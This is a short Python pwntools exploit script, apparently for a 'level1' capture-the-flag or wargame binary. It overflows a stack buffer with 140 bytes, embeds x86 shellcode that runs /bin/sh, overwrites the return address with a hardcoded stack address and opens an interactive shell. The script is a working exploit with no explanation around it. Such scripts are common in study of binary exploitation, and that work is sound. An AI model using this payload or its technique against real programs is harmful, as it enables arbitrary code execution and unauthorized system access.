#coding=utf-8
from pwn import *

p = process('./level1')
ret = 0xbffff290

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload = shellcode + 'A' * (140 - len(shellcode)) + p32(ret)

p.send(payload)
p.interactive()
